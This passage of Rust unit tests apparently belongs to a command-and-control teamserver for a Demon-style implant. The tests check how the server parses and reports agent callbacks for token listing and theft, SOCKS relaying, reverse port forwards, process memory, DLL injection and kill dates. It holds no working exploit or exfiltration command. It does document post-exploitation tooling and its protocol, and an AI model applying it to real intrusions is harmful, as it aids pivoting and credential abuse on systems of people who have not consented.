            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 24, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token clear response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Token vault has been cleared"));
        Ok(())
    }

    #[tokio::test]
    async fn token_find_tokens_callback_formats_table() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::FindTokens));
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 1);
        add_utf16(&mut payload, "LAB\\admin");
        add_u32(&mut payload, 5678);
        add_u32(&mut payload, 0x10);
        add_u32(&mut payload, 0x3000);
        add_u32(&mut payload, 2);
        add_u32(&mut payload, 1);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 25, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token find response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(message.info.output.contains("LAB\\admin"));
        assert!(message.info.output.contains("High"));
        assert!(message.info.output.contains("Primary"));
        assert!(message.info.output.contains("token steal"));
        Ok(())
    }

    #[tokio::test]
    async fn token_find_tokens_callback_failure() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonTokenCommand::FindTokens));
        add_u32(&mut payload, 0);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 26, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token find failure response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to list existing tokens"));
        Ok(())
    }

    #[tokio::test]
    async fn socket_read_callback_broadcasts_error_when_relay_delivery_fails()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonSocketCommand::Read));
        add_u32(&mut payload, 0x55);
        add_u32(&mut payload, u32::from(DemonSocketType::ReverseProxy));
        add_u32(&mut payload, 1);
        add_bytes(&mut payload, b"hello");

        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandSocket), 27, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("socket relay delivery error missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let msg = message.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(msg.contains("Failed to deliver socks data for 85"));
        assert!(msg.contains("SOCKS5 client 0x00000055 not found"));
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn socket_rportfwd_add_callback_broadcasts_success_and_failure()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut success = Vec::new();
        add_u32(&mut success, u32::from(DemonSocketCommand::ReversePortForwardAdd));
        add_u32(&mut success, 1);
        add_u32(&mut success, 0x55);
        add_u32(&mut success, u32::from_le_bytes([127, 0, 0, 1]));
        add_u32(&mut success, 4444);
        add_u32(&mut success, u32::from_le_bytes([10, 0, 0, 5]));
        add_u32(&mut success, 8080);

        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandSocket), 28, &success)
            .await?;

        let success_event = receiver.recv().await.ok_or("missing rportfwd add success event")?;
        let OperatorMessage::AgentResponse(success_message) = success_event else {
            panic!("expected agent response event");
        };
        assert_eq!(success_message.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        assert_eq!(
            success_message.info.extra.get("Message"),
            Some(&Value::String(
                "Started reverse port forward on 127.0.0.1:4444 to 10.0.0.5:8080 [Id: 55]"
                    .to_owned(),
            ))
        );

        let mut failure = Vec::new();
        add_u32(&mut failure, u32::from(DemonSocketCommand::ReversePortForwardAdd));
        add_u32(&mut failure, 0);
        add_u32(&mut failure, 0x66);
        add_u32(&mut failure, u32::from_le_bytes([192, 168, 1, 10]));
        add_u32(&mut failure, 9001);
        add_u32(&mut failure, u32::from_le_bytes([172, 16, 1, 20]));
        add_u32(&mut failure, 22);

        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandSocket), 29, &failure)
            .await?;

        let failure_event = receiver.recv().await.ok_or("missing rportfwd add failure event")?;
        let OperatorMessage::AgentResponse(failure_message) = failure_event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            failure_message.info.extra.get("Type"),
            Some(&Value::String("Error".to_owned()))
        );
        assert_eq!(
            failure_message.info.extra.get("Message"),
            Some(&Value::String(
                "Failed to start reverse port forward on 192.168.1.10:9001 to 172.16.1.20:22"
                    .to_owned(),
            ))
        );
        Ok(())
    }

    #[tokio::test]
    async fn socket_rportfwd_list_callback_formats_output_rows()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonSocketCommand::ReversePortForwardList));
        add_u32(&mut payload, 0x21);
        add_u32(&mut payload, u32::from_le_bytes([127, 0, 0, 1]));
        add_u32(&mut payload, 8080);
        add_u32(&mut payload, u32::from_le_bytes([10, 0, 0, 8]));
        add_u32(&mut payload, 80);
        add_u32(&mut payload, 0x22);
        add_u32(&mut payload, u32::from_le_bytes([0, 0, 0, 0]));
        add_u32(&mut payload, 8443);
        add_u32(&mut payload, u32::from_le_bytes([192, 168, 56, 10]));
        add_u32(&mut payload, 443);

        dispatcher
            .dispatch(0xCAFE_BABE, u32::from(DemonCommand::CommandSocket), 30, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("missing rportfwd list event")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("reverse port forwards:".to_owned()))
        );
        assert!(message.info.output.contains("Socket ID"));
        assert!(message.info.output.contains("21           127.0.0.1:8080 -> 10.0.0.8:80"));
        assert!(message.info.output.contains("22           0.0.0.0:8443 -> 192.168.56.10:443"));
        Ok(())
    }

    #[tokio::test]
    async fn socket_rportfwd_remove_callback_only_broadcasts_for_rportfwd_type()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonSocketCommand::ReversePortForwardRemove));
        add_u32(&mut payload, 0x88);
        add_u32(&mut payload, u32::from(DemonSocketType::ReversePortForward));
        add_u32(&mut payload, u32::from_le_bytes([127, 0, 0, 1]));
        add_u32(&mut payload, 7000);
        add_u32(&mut payload, u32::from_le_bytes([10, 10, 10, 10]));
        add_u32(&mut payload, 3389);

        dispatcher
            .dispatch(0xBEEF_CAFE, u32::from(DemonCommand::CommandSocket), 31, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("missing rportfwd remove event")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String(
                "Successful closed and removed rportfwd [SocketID: 88] [Forward: 127.0.0.1:7000 -> 10.10.10.10:3389]"
                    .to_owned(),
            ))
        );

        let mut other_type = Vec::new();
        add_u32(&mut other_type, u32::from(DemonSocketCommand::ReversePortForwardRemove));
        add_u32(&mut other_type, 0x99);
        add_u32(&mut other_type, u32::from(DemonSocketType::ReverseProxy));
        add_u32(&mut other_type, u32::from_le_bytes([127, 0, 0, 1]));
        add_u32(&mut other_type, 7001);
        add_u32(&mut other_type, u32::from_le_bytes([10, 10, 10, 11]));
        add_u32(&mut other_type, 3390);

        dispatcher
            .dispatch(0xBEEF_CAFE, u32::from(DemonCommand::CommandSocket), 32, &other_type)
            .await?;

        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "non-rportfwd remove should not broadcast an event"
        );
        Ok(())
    }

    #[tokio::test]
    async fn socket_rportfwd_clear_callback_broadcasts_success_and_failure()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut success = Vec::new();
        add_u32(&mut success, u32::from(DemonSocketCommand::ReversePortForwardClear));
        add_u32(&mut success, 1);
        dispatcher
            .dispatch(0xDEAD_BEEF, u32::from(DemonCommand::CommandSocket), 33, &success)
            .await?;

        let success_event = receiver.recv().await.ok_or("missing rportfwd clear success event")?;
        let OperatorMessage::AgentResponse(success_message) = success_event else {
            panic!("expected agent response event");
        };
        assert_eq!(success_message.info.extra.get("Type"), Some(&Value::String("Good".to_owned())));
        assert_eq!(
            success_message.info.extra.get("Message"),
            Some(&Value::String("Successful closed and removed all rportfwds".to_owned()))
        );

        let mut failure = Vec::new();
        add_u32(&mut failure, u32::from(DemonSocketCommand::ReversePortForwardClear));
        add_u32(&mut failure, 0);
        dispatcher
            .dispatch(0xDEAD_BEEF, u32::from(DemonCommand::CommandSocket), 34, &failure)
            .await?;

        let failure_event = receiver.recv().await.ok_or("missing rportfwd clear failure event")?;
        let OperatorMessage::AgentResponse(failure_message) = failure_event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            failure_message.info.extra.get("Type"),
            Some(&Value::String("Error".to_owned()))
        );
        assert_eq!(
            failure_message.info.extra.get("Message"),
            Some(&Value::String("Failed to closed and remove all rportfwds".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn socket_write_callback_broadcasts_error_on_failure()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonSocketCommand::Write));
        add_u32(&mut payload, 0x44);
        add_u32(&mut payload, u32::from(DemonSocketType::ReverseProxy));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 10061);

        dispatcher
            .dispatch(0xFACE_FEED, u32::from(DemonCommand::CommandSocket), 35, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("missing socket write failure event")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Failed to write to socks target 68: 10061".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn socket_connect_and_close_callbacks_drive_socks_client_lifecycle()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        registry
            .insert(sample_agent_info(
                0x1234_5678,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets.clone(),
            None,
        );

        let started = sockets.add_socks_server(0x1234_5678, "0").await?;
        let addr = started
            .split_whitespace()
            .last()
            .ok_or("SOCKS server address missing from start message")?;
        let mut client = TcpStream::connect(addr).await?;

        client.write_all(&[5, 1, 0]).await?;
        let mut negotiation = [0_u8; 2];
        client.read_exact(&mut negotiation).await?;
        assert_eq!(negotiation, [5, 0]);

        client.write_all(&[5, 1, 0, 1, 127, 0, 0, 1, 0x1F, 0x90]).await?;

        let socket_id = timeout(Duration::from_secs(5), async {
            loop {
                let queued = registry.queued_jobs(0x1234_5678).await?;
                if let Some(job) = queued.iter().find(|job| job.command_line == "socket connect") {
                    let socket_id =
                        u32::from_le_bytes(job.payload[4..8].try_into().map_err(|_| "socket id")?);
                    return Ok::<u32, Box<dyn std::error::Error>>(socket_id);
                }
                tokio::task::yield_now().await;
            }
        })
        .await
        .map_err(|_| {
            std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                "timed out waiting for socket connect job to be queued",
            )
        })??;

        let mut connect = Vec::new();
        add_u32(&mut connect, u32::from(DemonSocketCommand::Connect));
        add_u32(&mut connect, 1);
        add_u32(&mut connect, socket_id);
        add_u32(&mut connect, 0);
        dispatcher
            .dispatch(0x1234_5678, u32::from(DemonCommand::CommandSocket), 36, &connect)
            .await?;

        let mut connect_reply = [0_u8; 10];
        client.read_exact(&mut connect_reply).await?;
        assert_eq!(connect_reply, [5, 0, 0, 1, 127, 0, 0, 1, 0x1F, 0x90]);

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonSocketCommand::Close));
        add_u32(&mut close, socket_id);
        add_u32(&mut close, u32::from(DemonSocketType::ReverseProxy));
        dispatcher
            .dispatch(0x1234_5678, u32::from(DemonCommand::CommandSocket), 37, &close)
            .await?;

        let mut eof = [0_u8; 1];
        let closed = timeout(Duration::from_secs(1), client.read(&mut eof)).await?;
        assert_eq!(closed?, 0);
        Ok(())
    }

    #[tokio::test]
    async fn socket_callback_rejects_unknown_subcommands() -> Result<(), Box<dyn std::error::Error>>
    {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let error = dispatcher
            .dispatch(
                0xDEAD_BEEF,
                u32::from(DemonCommand::CommandSocket),
                38,
                &0xFFFF_FFFF_u32.to_le_bytes(),
            )
            .await
            .expect_err("unknown socket subcommand should fail");
        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload { command_id, .. }
                if command_id == u32::from(DemonCommand::CommandSocket)
        ));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_modules_handler_broadcasts_module_list()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonProcessCommand::Modules));
        add_u32(&mut payload, 1234);
        add_bytes(&mut payload, b"ntdll.dll");
        add_u64(&mut payload, 0x7FFA_0000_0000);
        add_bytes(&mut payload, b"kernel32.dll");
        add_u64(&mut payload, 0x7FFA_1000_0000);

        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandProc), 10, &payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "modules response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Process Modules (PID: 1234):".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        let rows = message
            .info
            .extra
            .get("ModuleRows")
            .and_then(Value::as_array)
            .ok_or_else(|| "structured module rows missing".to_owned())?;
        assert_eq!(rows.len(), 2);
        assert_eq!(rows[0].get("Name"), Some(&Value::String("ntdll.dll".to_owned())));
        assert_eq!(rows[0].get("Base"), Some(&Value::String("0x00007FFA00000000".to_owned())));
        assert_eq!(rows[1].get("Name"), Some(&Value::String("kernel32.dll".to_owned())));
        assert!(message.info.output.contains("ntdll.dll"));
        assert!(message.info.output.contains("kernel32.dll"));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_grep_handler_broadcasts_matching_processes()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonProcessCommand::Grep));
        add_utf16(&mut payload, "svchost.exe");
        add_u32(&mut payload, 800);
        add_u32(&mut payload, 4);
        add_bytes(&mut payload, b"NT AUTHORITY\\SYSTEM");
        add_u32(&mut payload, 64);

        dispatcher
            .dispatch(0x1122_3344, u32::from(DemonCommand::CommandProc), 11, &payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "grep response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Process Grep:".to_owned()))
        );
        let rows = message
            .info
            .extra
            .get("GrepRows")
            .and_then(Value::as_array)
            .ok_or_else(|| "structured grep rows missing".to_owned())?;
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].get("Name"), Some(&Value::String("svchost.exe".to_owned())));
        assert_eq!(rows[0].get("PID"), Some(&Value::from(800)));
        assert_eq!(rows[0].get("PPID"), Some(&Value::from(4)));
        assert_eq!(rows[0].get("Arch"), Some(&Value::String("x64".to_owned())));
        assert!(message.info.output.contains("svchost.exe"));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_memory_handler_broadcasts_memory_regions()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonProcessCommand::Memory));
        add_u32(&mut payload, 5678);
        add_u32(&mut payload, 0x40); // PAGE_EXECUTE_READWRITE
        add_u64(&mut payload, 0x0000_0140_0000_0000);
        add_u32(&mut payload, 0x1000);
        add_u32(&mut payload, 0x40); // PAGE_EXECUTE_READWRITE
        add_u32(&mut payload, 0x1000); // MEM_COMMIT
        add_u32(&mut payload, 0x1000000); // MEM_IMAGE

        dispatcher
            .dispatch(0xDEAD_BEEF, u32::from(DemonCommand::CommandProc), 12, &payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "memory response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(
            message
                .info
                .extra
                .get("Message")
                .and_then(Value::as_str)
                .is_some_and(|m| m.contains("PID: 5678"))
        );
        let rows = message
            .info
            .extra
            .get("MemoryRows")
            .and_then(Value::as_array)
            .ok_or_else(|| "structured memory rows missing".to_owned())?;
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].get("Base"), Some(&Value::String("0x0000014000000000".to_owned())));
        assert_eq!(rows[0].get("Size"), Some(&Value::String("0x1000".to_owned())));
        assert_eq!(
            rows[0].get("Protect"),
            Some(&Value::String("PAGE_EXECUTE_READWRITE".to_owned()))
        );
        assert_eq!(rows[0].get("State"), Some(&Value::String("MEM_COMMIT".to_owned())));
        assert_eq!(rows[0].get("Type"), Some(&Value::String("MEM_IMAGE".to_owned())));
        assert!(message.info.output.contains("PAGE_EXECUTE_READWRITE"));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_modules_handler_handles_empty_module_list()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonProcessCommand::Modules));
        add_u32(&mut payload, 9999);

        dispatcher
            .dispatch(0xCAFE_BABE, u32::from(DemonCommand::CommandProc), 13, &payload)
            .await?;

        let event =
            receiver.recv().await.ok_or_else(|| "empty modules response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        let rows = message
            .info
            .extra
            .get("ModuleRows")
            .and_then(Value::as_array)
            .ok_or_else(|| "module rows should be present even if empty".to_owned())?;
        assert!(rows.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn builtin_inject_dll_handler_broadcasts_success()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
            .dispatch(
                0xBEEF_0001,
                u32::from(DemonCommand::CommandInjectDll),
                20,
                &u32::from(DemonInjectError::Success).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or("inject dll response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successfully injected DLL into remote process".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Good".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_inject_dll_handler_broadcasts_error() -> Result<(), Box<dyn std::error::Error>>
    {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
            .dispatch(
                0xBEEF_0002,
                u32::from(DemonCommand::CommandInjectDll),
                21,
                &u32::from(DemonInjectError::Failed).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or("inject dll error missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Failed to inject DLL into remote process".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_inject_dll_handler_broadcasts_arch_mismatch()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
            .dispatch(
                0xBEEF_0003,
                u32::from(DemonCommand::CommandInjectDll),
                22,
                &u32::from(DemonInjectError::ProcessArchMismatch).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or("inject dll arch mismatch missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("DLL injection failed: process architecture mismatch".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_spawn_dll_handler_broadcasts_success() -> Result<(), Box<dyn std::error::Error>>
    {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
            .dispatch(
                0xBEEF_0010,
                u32::from(DemonCommand::CommandSpawnDll),
                30,
                &u32::from(DemonInjectError::Success).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or("spawn dll response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successfully spawned DLL in new process".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Good".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_spawn_dll_handler_broadcasts_error() -> Result<(), Box<dyn std::error::Error>>
    {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
            .dispatch(
                0xBEEF_0011,
                u32::from(DemonCommand::CommandSpawnDll),
                31,
                &u32::from(DemonInjectError::Failed).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or("spawn dll error missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Failed to spawn DLL in new process".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_exit_handler_marks_agent_dead_and_broadcasts_events()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        registry
            .insert(sample_agent_info(
                0xAABB_CCDD,
                [0x41; AGENT_KEY_LENGTH],
                [0x24; AGENT_IV_LENGTH],
            ))
            .await?;
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets.clone(),
            None,
        );
        sockets.add_socks_server(0xAABB_CCDD, "0").await?;

        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandExit), 40, &1_u32.to_le_bytes())
            .await?;

        let event = receiver.recv().await.ok_or("agent update missing")?;
        let OperatorMessage::AgentUpdate(message) = event else {
            panic!("expected agent update event");
        };
        assert_eq!(message.info.agent_id, "AABBCCDD");
        assert_eq!(message.info.marked, "Dead");

        let event = receiver.recv().await.ok_or("agent response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String(
                "Agent has been tasked to cleanup and exit thread. cya...".to_owned(),
            ))
        );

        let agent = registry.get(0xAABB_CCDD).await.ok_or("agent should remain tracked")?;
        assert!(!agent.active);
        assert_eq!(sockets.list_socks_servers(0xAABB_CCDD).await, "No active SOCKS5 servers");
        Ok(())
    }

    #[tokio::test]
    async fn builtin_kill_date_handler_marks_agent_dead_and_broadcasts_response()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        registry
            .insert(sample_agent_info(
                0x1020_3040,
                [0x42; AGENT_KEY_LENGTH],
                [0x25; AGENT_IV_LENGTH],
            ))
            .await?;
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets.clone(),
            None,
        );
        sockets.add_socks_server(0x1020_3040, "0").await?;

        dispatcher.dispatch(0x1020_3040, u32::from(DemonCommand::CommandKillDate), 41, &[]).await?;

        let _ = receiver.recv().await.ok_or("agent update missing")?;
        let event = receiver.recv().await.ok_or("agent response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String(
                "Agent has reached its kill date, tasked to cleanup and exit thread. cya..."
                    .to_owned(),
            ))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Good".to_owned())));
        assert_eq!(sockets.list_socks_servers(0x1020_3040).await, "No active SOCKS5 servers");
        Ok(())
    }

    #[tokio::test]
    async fn builtin_demon_info_handler_formats_memory_and_process_messages()
    -> Result<(), Box<dyn std::error::Error>> {
